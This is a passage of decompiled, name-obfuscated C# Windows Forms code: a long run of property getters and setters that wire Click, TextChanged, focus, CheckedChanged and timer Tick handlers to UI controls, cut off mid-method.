		this.pictureBox_5 = pictureBox_16;
		pictureBox = this.pictureBox_5;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C29 RID: 3113 RVA: 0x000079C4 File Offset: 0x00005BC4
	internal Label vmethod_124()
	{
		return this.label_25;
	}

	// Token: 0x06000C2A RID: 3114 RVA: 0x000079CC File Offset: 0x00005BCC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_125(Label label_40)
	{
		this.label_25 = label_40;
	}

	// Token: 0x06000C2B RID: 3115 RVA: 0x000079D5 File Offset: 0x00005BD5
	internal TextBox vmethod_126()
	{
		return this.textBox_12;
	}

	// Token: 0x06000C2C RID: 3116 RVA: 0x00061BE4 File Offset: 0x0005FDE4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_127(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_28);
		EventHandler value2 = new EventHandler(this.method_29);
		EventHandler value3 = new EventHandler(this.method_30);
		TextBox textBox = this.textBox_12;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
			textBox.GotFocus -= value2;
			textBox.LostFocus -= value3;
		}
		this.textBox_12 = textBox_20;
		textBox = this.textBox_12;
		if (textBox != null)
		{
			textBox.TextChanged += value;
			textBox.GotFocus += value2;
			textBox.LostFocus += value3;
		}
	}

	// Token: 0x06000C2D RID: 3117 RVA: 0x000079DD File Offset: 0x00005BDD
	internal Label vmethod_128()
	{
		return this.label_26;
	}

	// Token: 0x06000C2E RID: 3118 RVA: 0x000079E5 File Offset: 0x00005BE5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_129(Label label_40)
	{
		this.label_26 = label_40;
	}

	// Token: 0x06000C2F RID: 3119 RVA: 0x000079EE File Offset: 0x00005BEE
	internal TextBox vmethod_130()
	{
		return this.textBox_13;
	}

	// Token: 0x06000C30 RID: 3120 RVA: 0x00061C60 File Offset: 0x0005FE60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_131(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_31);
		EventHandler value2 = new EventHandler(this.method_32);
		EventHandler value3 = new EventHandler(this.method_33);
		TextBox textBox = this.textBox_13;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
			textBox.GotFocus -= value2;
			textBox.LostFocus -= value3;
		}
		this.textBox_13 = textBox_20;
		textBox = this.textBox_13;
		if (textBox != null)
		{
			textBox.TextChanged += value;
			textBox.GotFocus += value2;
			textBox.LostFocus += value3;
		}
	}

	// Token: 0x06000C31 RID: 3121 RVA: 0x000079F6 File Offset: 0x00005BF6
	internal Label vmethod_132()
	{
		return this.label_27;
	}

	// Token: 0x06000C32 RID: 3122 RVA: 0x000079FE File Offset: 0x00005BFE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_133(Label label_40)
	{
		this.label_27 = label_40;
	}

	// Token: 0x06000C33 RID: 3123 RVA: 0x00007A07 File Offset: 0x00005C07
	internal TextBox vmethod_134()
	{
		return this.textBox_14;
	}

	// Token: 0x06000C34 RID: 3124 RVA: 0x00061CDC File Offset: 0x0005FEDC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_135(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_35);
		TextBox textBox = this.textBox_14;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_14 = textBox_20;
		textBox = this.textBox_14;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C35 RID: 3125 RVA: 0x00007A0F File Offset: 0x00005C0F
	internal Label vmethod_136()
	{
		return this.label_28;
	}

	// Token: 0x06000C36 RID: 3126 RVA: 0x00007A17 File Offset: 0x00005C17
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_137(Label label_40)
	{
		this.label_28 = label_40;
	}

	// Token: 0x06000C37 RID: 3127 RVA: 0x00007A20 File Offset: 0x00005C20
	internal CheckBox vmethod_138()
	{
		return this.checkBox_5;
	}

	// Token: 0x06000C38 RID: 3128 RVA: 0x00007A28 File Offset: 0x00005C28
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_139(CheckBox checkBox_18)
	{
		this.checkBox_5 = checkBox_18;
	}

	// Token: 0x06000C39 RID: 3129 RVA: 0x00007A31 File Offset: 0x00005C31
	internal TextBox vmethod_140()
	{
		return this.textBox_15;
	}

	// Token: 0x06000C3A RID: 3130 RVA: 0x00061D20 File Offset: 0x0005FF20
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_141(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_36);
		TextBox textBox = this.textBox_15;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_15 = textBox_20;
		textBox = this.textBox_15;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C3B RID: 3131 RVA: 0x00007A39 File Offset: 0x00005C39
	internal Label vmethod_142()
	{
		return this.label_29;
	}

	// Token: 0x06000C3C RID: 3132 RVA: 0x00007A41 File Offset: 0x00005C41
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_143(Label label_40)
	{
		this.label_29 = label_40;
	}

	// Token: 0x06000C3D RID: 3133 RVA: 0x00007A4A File Offset: 0x00005C4A
	internal PictureBox vmethod_144()
	{
		return this.pictureBox_6;
	}

	// Token: 0x06000C3E RID: 3134 RVA: 0x00061D64 File Offset: 0x0005FF64
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_145(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_37);
		PictureBox pictureBox = this.pictureBox_6;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_6 = pictureBox_16;
		pictureBox = this.pictureBox_6;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C3F RID: 3135 RVA: 0x00007A52 File Offset: 0x00005C52
	internal PictureBox vmethod_146()
	{
		return this.pictureBox_7;
	}

	// Token: 0x06000C40 RID: 3136 RVA: 0x00061DA8 File Offset: 0x0005FFA8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_147(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_38);
		PictureBox pictureBox = this.pictureBox_7;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_7 = pictureBox_16;
		pictureBox = this.pictureBox_7;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C41 RID: 3137 RVA: 0x00007A5A File Offset: 0x00005C5A
	internal Label vmethod_148()
	{
		return this.label_30;
	}

	// Token: 0x06000C42 RID: 3138 RVA: 0x00007A62 File Offset: 0x00005C62
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_149(Label label_40)
	{
		this.label_30 = label_40;
	}

	// Token: 0x06000C43 RID: 3139 RVA: 0x00007A6B File Offset: 0x00005C6B
	internal TextBox vmethod_150()
	{
		return this.textBox_16;
	}

	// Token: 0x06000C44 RID: 3140 RVA: 0x00061DEC File Offset: 0x0005FFEC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_151(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_40);
		TextBox textBox = this.textBox_16;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_16 = textBox_20;
		textBox = this.textBox_16;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C45 RID: 3141 RVA: 0x00007A73 File Offset: 0x00005C73
	internal Label vmethod_152()
	{
		return this.label_31;
	}

	// Token: 0x06000C46 RID: 3142 RVA: 0x00007A7B File Offset: 0x00005C7B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_153(Label label_40)
	{
		this.label_31 = label_40;
	}

	// Token: 0x06000C47 RID: 3143 RVA: 0x00007A84 File Offset: 0x00005C84
	internal Label vmethod_154()
	{
		return this.label_32;
	}

	// Token: 0x06000C48 RID: 3144 RVA: 0x00007A8C File Offset: 0x00005C8C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_155(Label label_40)
	{
		this.label_32 = label_40;
	}

	// Token: 0x06000C49 RID: 3145 RVA: 0x00007A95 File Offset: 0x00005C95
	internal TextBox vmethod_156()
	{
		return this.textBox_17;
	}

	// Token: 0x06000C4A RID: 3146 RVA: 0x00061E30 File Offset: 0x00060030
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_157(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_41);
		TextBox textBox = this.textBox_17;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_17 = textBox_20;
		textBox = this.textBox_17;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C4B RID: 3147 RVA: 0x00007A9D File Offset: 0x00005C9D
	internal Label vmethod_158()
	{
		return this.label_33;
	}

	// Token: 0x06000C4C RID: 3148 RVA: 0x00007AA5 File Offset: 0x00005CA5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_159(Label label_40)
	{
		this.label_33 = label_40;
	}

	// Token: 0x06000C4D RID: 3149 RVA: 0x00007AAE File Offset: 0x00005CAE
	internal PictureBox vmethod_160()
	{
		return this.pictureBox_8;
	}

	// Token: 0x06000C4E RID: 3150 RVA: 0x00061E74 File Offset: 0x00060074
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_161(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_42);
		PictureBox pictureBox = this.pictureBox_8;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_8 = pictureBox_16;
		pictureBox = this.pictureBox_8;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C4F RID: 3151 RVA: 0x00007AB6 File Offset: 0x00005CB6
	internal CheckBox vmethod_162()
	{
		return this.checkBox_6;
	}

	// Token: 0x06000C50 RID: 3152 RVA: 0x00061EB8 File Offset: 0x000600B8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_163(CheckBox checkBox_18)
	{
		EventHandler value = new EventHandler(this.method_44);
		CheckBox checkBox = this.checkBox_6;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
		}
		this.checkBox_6 = checkBox_18;
		checkBox = this.checkBox_6;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
		}
	}

	// Token: 0x06000C51 RID: 3153 RVA: 0x00007ABE File Offset: 0x00005CBE
	internal PictureBox vmethod_164()
	{
		return this.pictureBox_9;
	}

	// Token: 0x06000C52 RID: 3154 RVA: 0x00061EFC File Offset: 0x000600FC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_165(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_43);
		PictureBox pictureBox = this.pictureBox_9;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_9 = pictureBox_16;
		pictureBox = this.pictureBox_9;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C53 RID: 3155 RVA: 0x00007AC6 File Offset: 0x00005CC6
	internal RadioButton vmethod_166()
	{
		return this.radioButton_2;
	}

	// Token: 0x06000C54 RID: 3156 RVA: 0x00007ACE File Offset: 0x00005CCE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_167(RadioButton radioButton_4)
	{
		this.radioButton_2 = radioButton_4;
	}

	// Token: 0x06000C55 RID: 3157 RVA: 0x00007AD7 File Offset: 0x00005CD7
	internal RadioButton vmethod_168()
	{
		return this.radioButton_3;
	}

	// Token: 0x06000C56 RID: 3158 RVA: 0x00007ADF File Offset: 0x00005CDF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_169(RadioButton radioButton_4)
	{
		this.radioButton_3 = radioButton_4;
	}

	// Token: 0x06000C57 RID: 3159 RVA: 0x00007AE8 File Offset: 0x00005CE8
	internal VisualButton vmethod_170()
	{
		return this.visualButton_0;
	}

	// Token: 0x06000C58 RID: 3160 RVA: 0x00061F40 File Offset: 0x00060140
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_171(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_46);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_12;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C59 RID: 3161 RVA: 0x00007AF0 File Offset: 0x00005CF0
	internal VisualButton vmethod_172()
	{
		return this.visualButton_1;
	}

	// Token: 0x06000C5A RID: 3162 RVA: 0x00061F84 File Offset: 0x00060184
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_173(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_47);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_12;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C5B RID: 3163 RVA: 0x00007AF8 File Offset: 0x00005CF8
	internal System.Windows.Forms.Timer vmethod_174()
	{
		return this.timer_0;
	}

	// Token: 0x06000C5C RID: 3164 RVA: 0x00061FC8 File Offset: 0x000601C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_175(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_48);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_2;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000C5D RID: 3165 RVA: 0x00007B00 File Offset: 0x00005D00
	internal VisualButton vmethod_176()
	{
		return this.visualButton_2;
	}

	// Token: 0x06000C5E RID: 3166 RVA: 0x0006200C File Offset: 0x0006020C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_177(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_50);
		VisualButton visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_2 = visualButton_12;
		visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C5F RID: 3167 RVA: 0x00007B08 File Offset: 0x00005D08
	internal VisualButton vmethod_178()
	{
		return this.visualButton_3;
	}

	// Token: 0x06000C60 RID: 3168 RVA: 0x00062050 File Offset: 0x00060250
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_179(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_53);
		VisualButton visualButton = this.visualButton_3;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_3 = visualButton_12;
		visualButton = this.visualButton_3;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C61 RID: 3169 RVA: 0x00007B10 File Offset: 0x00005D10
	internal VisualButton vmethod_180()
	{
		return this.visualButton_4;
	}

	// Token: 0x06000C62 RID: 3170 RVA: 0x00062094 File Offset: 0x00060294
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_181(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_54);
		VisualButton visualButton = this.visualButton_4;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_4 = visualButton_12;
		visualButton = this.visualButton_4;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C63 RID: 3171 RVA: 0x00007B18 File Offset: 0x00005D18
	internal VisualButton vmethod_182()
	{
		return this.visualButton_5;
	}

	// Token: 0x06000C64 RID: 3172 RVA: 0x000620D8 File Offset: 0x000602D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_183(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_55);
		VisualButton visualButton = this.visualButton_5;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_5 = visualButton_12;
		visualButton = this.visualButton_5;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C65 RID: 3173 RVA: 0x00007B20 File Offset: 0x00005D20
	internal VisualButton vmethod_184()
	{
		return this.visualButton_6;
	}

	// Token: 0x06000C66 RID: 3174 RVA: 0x0006211C File Offset: 0x0006031C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_185(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_56);
		VisualButton visualButton = this.visualButton_6;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_6 = visualButton_12;
		visualButton = this.visualButton_6;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C67 RID: 3175 RVA: 0x00007B28 File Offset: 0x00005D28
	internal TabPage vmethod_186()
	{
		return this.tabPage_4;
	}

	// Token: 0x06000C68 RID: 3176 RVA: 0x00007B30 File Offset: 0x00005D30
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_187(TabPage tabPage_7)
	{
		this.tabPage_4 = tabPage_7;
	}

	// Token: 0x06000C69 RID: 3177 RVA: 0x00007B39 File Offset: 0x00005D39
	internal CheckBox vmethod_188()
	{
		return this.checkBox_7;
	}

	// Token: 0x06000C6A RID: 3178 RVA: 0x00007B41 File Offset: 0x00005D41
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_189(CheckBox checkBox_18)
	{
		this.checkBox_7 = checkBox_18;
	}

	// Token: 0x06000C6B RID: 3179 RVA: 0x00007B4A File Offset: 0x00005D4A
	internal CheckBox vmethod_190()
	{
		return this.checkBox_8;
	}

	// Token: 0x06000C6C RID: 3180 RVA: 0x00007B52 File Offset: 0x00005D52
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_191(CheckBox checkBox_18)
	{
		this.checkBox_8 = checkBox_18;
	}

	// Token: 0x06000C6D RID: 3181 RVA: 0x00007B5B File Offset: 0x00005D5B
	internal VisualButton vmethod_192()
	{
		return this.visualButton_7;
	}

	// Token: 0x06000C6E RID: 3182 RVA: 0x00062160 File Offset: 0x00060360
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_193(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_58);
		VisualButton visualButton = this.visualButton_7;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_7 = visualButton_12;
		visualButton = this.visualButton_7;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C6F RID: 3183 RVA: 0x00007B63 File Offset: 0x00005D63
	internal PictureBox vmethod_194()
	{
		return this.pictureBox_10;
	}

	// Token: 0x06000C70 RID: 3184 RVA: 0x000621A4 File Offset: 0x000603A4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_195(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_59);
		PictureBox pictureBox = this.pictureBox_10;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_10 = pictureBox_16;
		pictureBox = this.pictureBox_10;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C71 RID: 3185 RVA: 0x00007B6B File Offset: 0x00005D6B
	internal Label vmethod_196()
	{
		return this.label_34;
	}

	// Token: 0x06000C72 RID: 3186 RVA: 0x00007B73 File Offset: 0x00005D73
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_197(Label label_40)
	{
		this.label_34 = label_40;
	}

	// Token: 0x06000C73 RID: 3187 RVA: 0x00007B7C File Offset: 0x00005D7C
	internal Label vmethod_198()
	{
		return this.label_35;
	}

	// Token: 0x06000C74 RID: 3188 RVA: 0x00007B84 File Offset: 0x00005D84
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_199(Label label_40)
	{
		this.label_35 = label_40;
	}

	// Token: 0x06000C75 RID: 3189 RVA: 0x00007B8D File Offset: 0x00005D8D
	internal CheckBox vmethod_200()
	{
		return this.checkBox_9;
	}

	// Token: 0x06000C76 RID: 3190 RVA: 0x00007B95 File Offset: 0x00005D95
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_201(CheckBox checkBox_18)
	{
		this.checkBox_9 = checkBox_18;
	}

	// Token: 0x06000C77 RID: 3191 RVA: 0x00007B9E File Offset: 0x00005D9E
	internal TabPage vmethod_202()
	{
		return this.tabPage_5;
	}

	// Token: 0x06000C78 RID: 3192 RVA: 0x00007BA6 File Offset: 0x00005DA6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_203(TabPage tabPage_7)
	{
		this.tabPage_5 = tabPage_7;
	}

	// Token: 0x06000C79 RID: 3193 RVA: 0x00007BAF File Offset: 0x00005DAF
	internal Label vmethod_204()
	{
		return this.label_36;
	}

	// Token: 0x06000C7A RID: 3194 RVA: 0x00007BB7 File Offset: 0x00005DB7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_205(Label label_40)
	{
		this.label_36 = label_40;
	}

	// Token: 0x06000C7B RID: 3195 RVA: 0x00007BC0 File Offset: 0x00005DC0
	internal CheckBox vmethod_206()
	{
		return this.checkBox_10;
	}

	// Token: 0x06000C7C RID: 3196 RVA: 0x00007BC8 File Offset: 0x00005DC8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_207(CheckBox checkBox_18)
	{
		this.checkBox_10 = checkBox_18;
	}

	// Token: 0x06000C7D RID: 3197 RVA: 0x00007BD1 File Offset: 0x00005DD1
	internal VisualButton vmethod_208()
	{
		return this.visualButton_8;
	}

	// Token: 0x06000C7E RID: 3198 RVA: 0x000621E8 File Offset: 0x000603E8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_209(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_64);
		VisualButton visualButton = this.visualButton_8;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_8 = visualButton_12;
		visualButton = this.visualButton_8;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C7F RID: 3199 RVA: 0x00007BD9 File Offset: 0x00005DD9
	internal CheckBox vmethod_210()
	{
		return this.checkBox_11;
	}

	// Token: 0x06000C80 RID: 3200 RVA: 0x00007BE1 File Offset: 0x00005DE1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_211(CheckBox checkBox_18)
	{
		this.checkBox_11 = checkBox_18;
	}

	// Token: 0x06000C81 RID: 3201 RVA: 0x00007BEA File Offset: 0x00005DEA
	internal CheckBox vmethod_212()
	{
		return this.checkBox_12;
	}

	// Token: 0x06000C82 RID: 3202 RVA: 0x00007BF2 File Offset: 0x00005DF2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_213(CheckBox checkBox_18)
	{
		this.checkBox_12 = checkBox_18;
	}

	// Token: 0x06000C83 RID: 3203 RVA: 0x00007BFB File Offset: 0x00005DFB
	internal PictureBox vmethod_214()
	{
		return this.pictureBox_11;
	}

	// Token: 0x06000C84 RID: 3204 RVA: 0x0006222C File Offset: 0x0006042C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_215(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_60);
		PictureBox pictureBox = this.pictureBox_11;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_11 = pictureBox_16;
		pictureBox = this.pictureBox_11;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C85 RID: 3205 RVA: 0x00007C03 File Offset: 0x00005E03
	internal CheckBox vmethod_216()
	{
		return this.checkBox_13;
	}

	// Token: 0x06000C86 RID: 3206 RVA: 0x00007C0B File Offset: 0x00005E0B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_217(CheckBox checkBox_18)
	{
		this.checkBox_13 = checkBox_18;
	}

	// Token: 0x06000C87 RID: 3207 RVA: 0x00007C14 File Offset: 0x00005E14
	internal CheckBox vmethod_218()
	{
		return this.checkBox_14;
	}

	// Token: 0x06000C88 RID: 3208 RVA: 0x00007C1C File Offset: 0x00005E1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_219(CheckBox checkBox_18)
	{
		this.checkBox_14 = checkBox_18;
	}

	// Token: 0x06000C89 RID: 3209 RVA: 0x00007C25 File Offset: 0x00005E25
	internal PictureBox vmethod_220()
	{
		return this.pictureBox_12;
	}

	// Token: 0x06000C8A RID: 3210 RVA: 0x00062270 File Offset: 0x00060470
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_221(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_61);
		PictureBox pictureBox = this.pictureBox_12;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_12 = pictureBox_16;
		pictureBox = this.pictureBox_12;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C8B RID: 3211 RVA: 0x00007C2D File Offset: 0x00005E2D
	internal TextBox vmethod_222()
	{
		return this.textBox_18;
	}

	// Token: 0x06000C8C RID: 3212 RVA: 0x000622B4 File Offset: 0x000604B4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_223(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_62);
		TextBox textBox = this.textBox_18;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_18 = textBox_20;
		textBox = this.textBox_18;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C8D RID: 3213 RVA: 0x00007C35 File Offset: 0x00005E35
	internal Label vmethod_224()
	{
		return this.label_37;
	}

	// Token: 0x06000C8E RID: 3214 RVA: 0x00007C3D File Offset: 0x00005E3D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_225(Label label_40)
	{
		this.label_37 = label_40;
	}

	// Token: 0x06000C8F RID: 3215 RVA: 0x00007C46 File Offset: 0x00005E46
	internal System.Windows.Forms.Timer vmethod_226()
	{
		return this.timer_1;
	}

	// Token: 0x06000C90 RID: 3216 RVA: 0x000622F8 File Offset: 0x000604F8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_227(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_63);
		System.Windows.Forms.Timer timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_1 = timer_2;
		timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000C91 RID: 3217 RVA: 0x00007C4E File Offset: 0x00005E4E
	internal PictureBox vmethod_228()
	{
		return this.pictureBox_13;
	}

	// Token: 0x06000C92 RID: 3218 RVA: 0x0006233C File Offset: 0x0006053C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_229(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_65);
		PictureBox pictureBox = this.pictureBox_13;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_13 = pictureBox_16;
		pictureBox = this.pictureBox_13;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C93 RID: 3219 RVA: 0x00007C56 File Offset: 0x00005E56
	internal PictureBox vmethod_230()
	{
		return this.pictureBox_14;
	}

	// Token: 0x06000C94 RID: 3220 RVA: 0x00062380 File Offset: 0x00060580
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_231(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_66);
		PictureBox pictureBox = this.pictureBox_14;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_14 = pictureBox_16;
		pictureBox = this.pictureBox_14;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C95 RID: 3221 RVA: 0x00007C5E File Offset: 0x00005E5E
	internal TabPage vmethod_232()
	{
		return this.tabPage_6;
	}

	// Token: 0x06000C96 RID: 3222 RVA: 0x00007C66 File Offset: 0x00005E66
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_233(TabPage tabPage_7)
	{
		this.tabPage_6 = tabPage_7;
	}

	// Token: 0x06000C97 RID: 3223 RVA: 0x00007C6F File Offset: 0x00005E6F
	internal VisualButton vmethod_234()
	{
		return this.visualButton_9;
	}

	// Token: 0x06000C98 RID: 3224 RVA: 0x000623C4 File Offset: 0x000605C4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_235(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_68);
		VisualButton visualButton = this.visualButton_9;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_9 = visualButton_12;
		visualButton = this.visualButton_9;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C99 RID: 3225 RVA: 0x00007C77 File Offset: 0x00005E77
	internal VisualButton vmethod_236()
	{
		return this.visualButton_10;
	}

	// Token: 0x06000C9A RID: 3226 RVA: 0x00062408 File Offset: 0x00060608
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_237(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_69);
		VisualButton visualButton = this.visualButton_10;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
